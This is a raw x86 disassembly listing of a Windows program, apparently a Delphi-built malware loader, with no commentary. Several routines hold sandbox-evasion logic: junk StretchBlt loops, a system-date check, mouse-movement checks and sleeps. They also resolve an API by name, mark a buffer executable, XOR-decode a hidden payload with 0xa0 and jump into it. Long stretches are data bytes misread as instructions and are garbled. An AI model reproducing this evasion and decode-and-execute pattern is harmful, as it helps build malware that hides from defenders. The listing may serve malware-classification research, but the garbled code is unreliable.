mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404858
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_46ee0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_46e7f0
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46e5f8
jmp r-xdata
call sub_464b8c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ee15
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403f10
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_40491c
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_44bee0
call sub_46c308
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_46e828
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_46b6cc
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44cfd4
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44d178
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_46c2d0
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_44a754
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403f84
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_44e7e8
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_46e97c
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403370
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44d14c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44d14c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_44d7d4
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_46c41c
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_46e9dc
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_46e5f8
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46e5f8
jmp r-xdata
sub_46ee1c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403f40
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403f40
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46ee7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_46eea8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_44e7e8
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_44e7e8
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_459fe4
sub_46ef38
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_46ef60
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_46f004
add [ eax ] eax
add [ eax ] al
mov [ esi ] cs
inc edi
add [ eax ] ch
sahf
inc esp
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push j_sub_4038f0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f06e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_464938
mov eax sub_464bb8
call sub_417c50
mov eax [ rw-data ]
push eax
call CloseHandle
sub_46f0c5
inc esi
add ah dh
int1
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0xd ] ah
inc esi
add [ ebx + eax ] cl
add [ edi + esi + 0x46 ] cl
add [ eax ] bh
adc [ edx ] eax
mov al [ 0x54004664 ]
inc si
add [ eax - 0x3fffbfcd ] bh
mov al [ esi ]
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
mov esp 0x34004666
dec ecx
inc ebp
add [ esp + ebp * 2 ] ch
inc esi
add [ eax - 0x75 ] dh
inc ecx
add [ eax + ebp * 2 + 0x46 ] bh
add [ eax - 0x3bffb998 ] bh
imul eax [ esi ] sub_44d41c
push eax
adc [ edx ] eax
cmp al 0x72
inc esi
add [ eax ] dh
push cs
inc edx
add ah bl
lodsd [ esi ]
inc esi
add [ ebx ] dl
inc esi
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
mov [ esi ] eax
add [ eax + 0x13540046 ] cl
inc ebp
add [ eax + 0x13 ] bl
inc ebp
add [ edx + ecx * 4 + 0x46 ] bh
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x40044d5 ] dl
jb r-xdata
add eax [ eax ]
add [ 0x46f36d00 ] dl
add al bh
add al [ eax ]
add [ eax ] al
add [ ecx ] cl
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax - 0x6f ] dh
inc esi
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi - 0x597bffbb ] ch
inc esi
add [ eax ] dl
pop ebx
inc esi
add al al
pop ebp
inc esi
add [ edi + edx * 4 + 0x46 ] ah
add [ eax + 0x1c004667 ] ah
adc [ ebp ] eax
xor [ esi ] bh
inc ebp
add al dl
jo r-xdata
jb r-xdata
je r-xdata
add [ eax + eax ] al
pop es
inc edx
jne r-xdata
cld
add al [ eax ]
add [ ecx ] al
add [ edx ] cl
push eax
outsd
jo r-xdata
inc ebp
add al cl
salc
inc esp
add [ edx + esi * 2 + 0x46 ] bh
add [ eax - 0x7 ] dh
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ ecx ] bl
inc esi
add [ eax ] ah
jns r-xdata
push eax
jb r-xdata
insb
xor [ eax ] ebp
add eax [ eax ]
add [ ebx ] cl
add [ esi ] cl
dec ebp
outsd
outsb
je r-xdata
outsd
outsb
je r-xdata
outsb
xor [ ebx + eax ] ecx
add [ eax ] al
add eax 0x6f430900
add [ eax ] al
or [ eax ] eax
or [ ecx + 0x6e ] al
imul ebp [ ebp + 0x61 ] 0x20316574
add eax [ eax ]
add [ eax ] cl
add [ edi ] al
push ebp
jo r-xdata
jo r-xdata
push 0xaa640046
inc esi
add al bl
inc esi
add [ eax - 0x5b ] ch
inc esi
add [ eax - 0x74 ] cl
inc esi
add [ edi ] bl
inc esi
add [ eax ] al
jb r-xdata
add [ edx + edx - 0x7a1bffbb ] bh
inc esi
add [ ecx + ecx * 4 + 0x46 ] al
add [ eax ] al
mov [ esi ] al
push esp
adc eax [ ebp ]
pop eax
adc eax [ ebp ]
jl r-xdata
adc [ edi + 0x43 ] bl
outsb
je r-xdata
push ebx
inc ebx
popad
imul ebp [ esi + 0x74 ] 0x65537265
je r-xdata
outsd
xor [ ebx + eax ] ebx
adc [ ebx ] al
add [ eax ] al
push es
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
or [ ebx + 0x70 ] edx
outsd
ja r-xdata
imul esi [ ebx + 0x74 ] 0x31431
add [ edi ] al
add [ ebx ] cl
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ eax ] ebx
add eax [ eax ]
add [ eax ] cl
add [ edi ] al
push ebp
jo r-xdata
outsb
jne r-xdata
inc esp
add ah al
inc ebp
add [ edi + ebp * 2 ] bl
inc esi
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0x10
jo r-xdata
mov al 0x48
inc ebp
add [ eax - 0x37 ] bh
add [ eax + 0x30004511 ] bh
inc esi
jo r-xdata
inc edx
add ah bh
inc ebx
add [ eax + 0x68 ] dh
add [ eax ] dl
pop edi
inc ebx
jb r-xdata
add [ eax + 0x27 ] cl
inc esi
add [ esp + edx * 8 + 0x42 ] al
add [ eax + 0x100042d5 ] dl
fld [ edx ]
loopne r-xdata
dec esp
stc
inc edx
jo r-xdata
str [ edx ]
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
outsd
js r-xdata
insb
imul esi [ esp + esi * 2 + 0x65 ] 0x3343172
add [ eax ] al
push cs
add [ esi ] al
sub al 0x3
add [ eax ] al
or al 0x0
or [ edx + esi * 2 + 0x65 ] edx
push esi
imul esp [ ebp + 0x77 ] 0x33031
add [ 0x70530900 ] cl
insb
outsb
popad
jb r-xdata
outsd
ja r-xdata
adc al [ eax ]
adc [ eax + 0x61 ] dl
cmp al 0x3
add [ eax ] al
adc [ eax ] al
or al 0x43
outsd
insb
outsd
jb r-xdata
add [ ebx + eax * 2 ] cl
xor ah [ ebx + eax ]
add [ eax ] al
or al [ eax ]
push cs
dec eax
popad
jb r-xdata
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
or [ ebx + 0x6f ] eax
add [ ebx ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x61 ] ecx
imul ebp [ esi + 0x4d ] 0x31756e65
add al 0x3
add [ eax ] al
add eax [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ eax ] ecx
push ebp
push sub_46f425
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f42c
retn
inc ebx
add ah dh
inc edi
inc ebx
add [ eax + 0x7 ] cl
inc ebx
add [ ecx + edi * 8 + 0x42 ] cl
push sub_46f6dd
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor [ eax ] eax
int1
inc esi
add [ eax + edi + 0x5e0046 ] dl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx + 0x46f3e4c0 ] cl
add [ eax - 0x4fffbbea ] cl
xchg ecx eax
inc ebp
add [ eax ] dh
je r-xdata
add [ ebx ] al
les eax [ ebp ]
push ebx
je r-xdata
imul esp [ ecx + 0x6c ] 0x4431676f
add eax [ eax ]
add [ edx ] dl
add [ eax ] dl
push eax
popad
push ebx
push 0x31657061
cmp [ ebx ] al
add [ eax ] al
push es
add [ eax + r-xdata ] dl
pop es
push es
push esp
inc esi
jo r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x4031676f
add eax [ eax ]
add [ ecx ] dl
add [ ebx ] dl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f6e4
retn
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
mov ebx 0x13e3
sub al 0x59
inc ebx
imul esp [ ecx + 0x6c ] 0x4831676f
add eax [ eax ]
add [ ebx ] dl
add [ esi ] cl
push edx
jo r-xdata
add [ ecx ] dl
add ch [ esi ]
xor al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x40 ] ch
add [ 0x74696e55 ] al
xor [ ebx - 0x1374aa40 ] ecx
xor eax eax
imul esi [ ecx + esi ] 0xe4c08b00
inc esi
test [ ecx ] cl
inc esp
add [ edx + 0x16880044 ] dl
inc esp
add [ eax + 0x30004591 ] dh
xor [ eax + eax ] edx
push esp
sub eax [ eax + eax + 0x30 ]
mov [ ebp ] r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
nop
nop
nop
dec ebx
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
outsd
jb r-xdata
imul esp [ ecx + 0x6c ] 0x631676f
push esp
inc esi
outsd
jb r-xdata
popad
arpl [ ebp + 0x44 ] sp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
push 0x0
push 0x0
call SetAbortProc
nop
call GetLastError
mov [ rw-data ] eax
nop
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e0
jae r-xdata
nop
jmp r-xdata
nop
nop
cmp [ rw-data ] 0x6
je r-xdata
nop
nop
jmp r-xdata
mov ebx 0x8f47
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
dec ebx
jne r-xdata
nop
nop
nop
nop
mov eax 0x1ebe45be
call sub_4026f4
mov ecx eax
nop
test ecx ecx
je r-xdata
mov ebx 0x1
mov esi 0xae
xor edx edx
div esi
cmp edx 0xff
jbe r-xdata
call sub_4030b4
mov eax ecx
add eax ebx
jae r-xdata
call sub_4030ac
mov [ eax ] dl
nop
inc ebx
cmp ebx 0x1ebe2897
jne r-xdata
call sub_4030b4
nop
nop
mov eax ebx
add eax 0x1
jae r-xdata
nop
nop
mov eax ecx
call sub_402714
mov ebx 0x8ad7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
dec ebx
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
xor ebx ebx
nop
push rw-data
call GetCursorPos
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
cmp eax 0x14
jbe r-xdata
call sub_4030b4
nop
push 0x0
push 0xf
call SleepEx
nop
nop
cmp ebx 0x4
jbe r-xdata
add ebx 0x1
jae r-xdata
push rw-data
call GetCursorPos
mov eax [ rw-data ]
sub eax [ rw-data ]
jno r-xdata
nop
mov eax rw-data
mov edx rw-data
mov ecx [ r-xdata ]
call sub_4050e8
nop
cmp [ rw-data ] 0x0
jne r-xdata
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_4030b4
nop
nop
push rw-data
mov ecx 0x40
mov edx 0x5a06
mov eax [ rw-data ]
call [ rw-data ]
nop
xor ebx ebx
jmp r-xdata
mov al [ eax ]
nop
nop
xor al 0xa0
mov edx [ rw-data ]
add edx ebx
jae r-xdata
call sub_4030b4
mov [ edx ] al
nop
nop
inc ebx
cmp ebx 0x5a07
jne r-xdata
call sub_4030b4
mov eax [ rw-data ]
add eax ebx
jae r-xdata
nop
mov eax 0x229b
mov edx [ rw-data ]
xchg edx eax
add eax edx
call eax
nop
jmp r-xdata
sub_46f430
push ebp
mov ebp esp
push ebx
push esi
xor eax eax
push ebp
push sub_46f6dd
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f6e4
retn
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
mov ebx 0x13e3
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
nop
nop
nop
dec ebx
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
push 0x0
push 0x0
call SetAbortProc
nop
call GetLastError
mov [ rw-data ] eax
nop
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e0
jae r-xdata
nop
jmp r-xdata
nop
nop
cmp [ rw-data ] 0x6
je r-xdata
nop
nop
jmp r-xdata
mov ebx 0x8f47
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
dec ebx
jne r-xdata
nop
nop
nop
nop
mov eax 0x1ebe45be
call sub_4026f4
mov ecx eax
nop
test ecx ecx
je r-xdata
mov ebx 0x1
mov esi 0xae
xor edx edx
div esi
cmp edx 0xff
jbe r-xdata
call sub_4030b4
mov eax ecx
add eax ebx
jae r-xdata
call sub_4030ac
mov [ eax ] dl
nop
inc ebx
cmp ebx 0x1ebe2897
jne r-xdata
call sub_4030b4
nop
nop
mov eax ebx
add eax 0x1
jae r-xdata
nop
nop
mov eax ecx
call sub_402714
mov ebx 0x8ad7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
dec ebx
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
xor ebx ebx
nop
push rw-data
call GetCursorPos
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call StretchBlt
cmp eax 0x14
jbe r-xdata
call sub_4030b4
nop
push 0x0
push 0xf
call SleepEx
nop
nop
cmp ebx 0x4
jbe r-xdata
add ebx 0x1
jae r-xdata
push rw-data
call GetCursorPos
mov eax [ rw-data ]
sub eax [ rw-data ]
jno r-xdata
nop
mov eax rw-data
mov edx rw-data
mov ecx [ r-xdata ]
call sub_4050e8
nop
cmp [ rw-data ] 0x0
jne r-xdata
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_4030b4
nop
nop
push rw-data
mov ecx 0x40
mov edx 0x5a06
mov eax [ rw-data ]
call [ rw-data ]
nop
xor ebx ebx
jmp r-xdata
mov al [ eax ]
nop
nop
xor al 0xa0
mov edx [ rw-data ]
add edx ebx
jae r-xdata
call sub_4030b4
mov [ edx ] al
nop
nop
inc ebx
cmp ebx 0x5a07
jne r-xdata
call sub_4030b4
mov eax [ rw-data ]
add eax ebx
jae r-xdata
nop
mov eax 0x229b
mov edx [ rw-data ]
xchg edx eax
add eax edx
call eax
nop
jmp r-xdata
sub_46f729
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46f74b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f752
retn
sub_46f754
cmp eax [ eax ]
add [ eax ] al
pop esp
test [ esi ] sub_405f48
sbb [ edi + 0x40 ] bl
add [ ebx * 2 + 0x5ce80040 ] bh
inc eax
add [ eax ] al
inc eax
add ah dl
pop edi
inc eax
add [ eax - 0x77ffbf94 ] bh
insb
inc eax
add al dh
insb
inc eax
add al al
insb
inc eax
add ah cl
push ebx
inc ecx
add [ ebx + edx * 2 + 0x70180041 ] bl
inc eax
add al ch
outsd
inc eax
add [ ebp + edx * 8 - 0x2bf3ffc0 ] cl
inc eax
add al bh
fld [ eax ]
enter 0x40dd 0x0
sbb [ ecx + eax * 2 ] al
mov al [ 0xffffffffe4004143 ]
inc ebp
inc ecx
add [ ebp + eax * 2 + 0x53940041 ] dh
inc ecx
add [ ebx + edx * 2 + 0x41 ] al
add [ eax - 0xfffbde4 ] ah
sbb eax [ edx ]
pushfd
xchg esp eax
inc edx
add [ esp + edx * 4 + 0x42 ] ch
add [ edi + edx * 4 + 0x42 ] dl
add [ edi + edx * 4 ] ah
inc edx
add [ esp + esi * 4 ] dl
inc edx
add ah dl
mov bl 0x42
add ah bl
mov [ 0xffffffffa3ac0042 ] eax
inc edx
add [ esp + ebx * 4 + 0x42 ] bl
add [ esp + ebx * 4 ] ch
inc edx
add ah bh
pop ds
inc edx
add ah cl
pop ds
inc edx
add [ eax - 0x6d ] ah
inc edx
add [ edx + edx * 4 - 0x445fffbe ] cl
inc ebp
add [ eax - 0x45 ] dh
inc ebp
add [ esp ] bl
inc edx
add ah ch
mov [ 0x215c0042 ] eax
inc esi
add ah ch
and [ esi ] al
mov [ fs : edx ] 0x34
mov [ edx ] 0xc
rol [ edx ] 0x1
mov eax 0x700042cf
rol [ edx ] 0x1
inc eax
rol [ edx ] 0x1
cmp cl dl
inc edx
add [ eax ] cl
rol [ edx ] 0x1
add cl dl
inc edx
add al dl
rol [ edx ] 0x1
enter 0x42d0 0x0
cwde
rol [ edx ] 0x1
test al 0xd1
inc edx
add [ eax - 0x2f ] bh
inc edx
add [ ecx + ebp ] bh
inc ebx
add [ ecx + ebp ] cl
inc ebx
add [ edx + esi * 2 ] cl
inc esp
add ah bl
jno r-xdata
add [ eax + 0x40004327 ] dl
sub [ ebx ] al
clc
daa
inc ebx
add [ eax ] bl
daa
inc ebx
add al ah
inc ebx
add [ eax + 0x27 ] dh
inc ebx
add [ eax + 0x27 ] al
inc ebx
add [ eax + 0x26 ] al
inc ebx
add [ eax ] dl
inc ebx
add [ eax + 0x7c004325 ] bh
and eax 0x73740043
inc esp
add [ ebx + esi * 2 + 0x44 ] al
add [ eax + ebp + 0x285c0043 ] ch
inc ebx
add [ ecx + ebp ] al
inc ebx
add [ eax + ebp + 0x25740043 ] dh
inc ebx
add [ ebp + 0x43 ] al
add [ ebx + edi * 8 - 0x4e3ffbd ] dl
inc ebx
add [ eax + 0x44004406 ] cl
push es
inc esp
add [ eax + 0x2000458e ] cl
mov es [ ebp ]
inc esp
movsb [ edi ] [ esi ]
inc ebp
add [ esp ] dl
inc ebp
add [ eax - 0x80 ] al
add [ esp + esi * 4 + 0x42 ] ch
add [ esp + esi * 4 ] bh
inc edx
add [ eax + 0x640042c1 ] ah
rol [ edx ] 0x8
rol [ edx ] cl
fcom st1
inc edx
add [ eax - 0x2e ] al
inc edx
add [ eax ] dl
rol [ edx ] cl
movsb [ edi ] [ esi ]
clc
inc edx
add [ eax - 0x8 ] cl
inc edx
add ah al
and al 0x43
add [ esp + 0x43 ] bh
add [ eax + 0x600042d0 ] dl
rol [ edx ] 0x1
pop eax
rol [ edx ] 0x1
sub al dl
inc edx
add al bl
daa
inc ebx
push eax
jno 0x46f9a1
add [ eax - 0x77ffbd3c ] bh
les eax [ edx ]
jo r-xdata
add [ ebx - 0x4bea7500 ] cl
inc esp
add al cl
jg r-xdata
inc esi
add [ eax + esi * 8 ] dl
inc esi
add [ eax ] dh
hlt
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_46f754
call sub_405ed4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46dac4
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46dadc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46db5c
call sub_403dfc
sub_401187
add [ esp + 0x4 ] 0xfffffff8
jmp sub_40582c
sub_401191
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405840
sub_401254
jmp [ __import_lookup_table_1(user32:CharNextA) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_401264
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_40128c
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_401294
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_40129c
